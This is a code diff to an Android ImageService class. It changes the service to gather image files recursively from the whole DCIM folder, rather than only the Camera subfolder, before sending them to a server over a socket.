@@ -33,6 +33,7 @@ import java.io.OutputStream;
 import java.net.InetAddress;
 import java.net.Socket;
 import java.net.UnknownHostException;
+import java.util.ArrayList;
 
 import static java.lang.Thread.sleep;
 
@@ -103,14 +104,17 @@ public class ImageService extends Service {
 
                 // Getting the Camera Folder
                 File dcim =
-                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM + "//Camera");
+                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
 
                 if (dcim == null) {
                     return;
                 }
 
-                //getting the images
-                File[] pics = dcim.listFiles();
+                //getting the images from DCIM recursively
+                ArrayList<File> pictures = new ArrayList<File>();
+                getPics(dcim,pictures);
+                File[] pics = new File[pictures.size()];
+                pics = pictures.toArray(pics);
 
                 //connecting to the server
                 try {
@@ -144,12 +148,7 @@ public class ImageService extends Service {
                             dataOut.writeInt(imgbyteLength);
                             output.write(imgbyte);
                             output.flush();
-                        }
-
-                        try {
                             Thread.sleep(1000);
-                        } catch (InterruptedException e) {
-                            e.printStackTrace();
                         }
 
                         //display completed message
@@ -192,5 +191,20 @@ public class ImageService extends Service {
         ByteArrayOutputStream stream = new ByteArrayOutputStream();
         bitmap.compress(Bitmap.CompressFormat.PNG, 70, stream);
         return stream.toByteArray();
+    }
+
+    public static void getPics(File dir, ArrayList<File> pics) {
+        File[] files = dir.listFiles();
+        for (File file : files) {
+            if (file.isDirectory()) {
+                getPics(file,pics);
+            }
+            else if(file.getName().endsWith(".jpg")
+                    || file.getName().endsWith(".png")
+                    || file.getName().endsWith(".gif")
+                    || file.getName().endsWith(".bmp")){
+                    pics.add(file);
+                }
+            }
     }
 }
